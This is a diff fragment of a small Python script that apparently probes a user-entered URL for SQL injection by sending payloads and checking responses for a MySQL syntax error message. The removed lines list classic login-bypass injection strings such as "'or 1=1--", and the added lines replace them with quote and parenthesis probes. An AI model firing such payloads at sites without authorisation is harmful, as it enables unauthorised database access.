@@ -3,7 +3,7 @@ from pip._vendor.distlib.compat import raw_input
 
 fullurl = raw_input("Url: ")
 errormsg = "You have an error in your SQL syntax"
-payloads = ["'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'or 1=1", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "'or 1=1/*", "'or 1=1--"] #whatever payloads you want here ## YOU CAN ADD YOUR OWN
+payloads = ["'", "\"", "\\", "')", "')))"]
 errorr = "yes"
 for payload in payloads:
     try:
@@ -14,7 +14,7 @@ for payload in payloads:
     except:
         print("[-] Error! Manually check this payload: " + payload)
         errorr = "no"
-        #sys.exit()
+        exit()
     if errormsg in fullbody:
         if errorr == "no":
             print("[-] That payload might not work!")
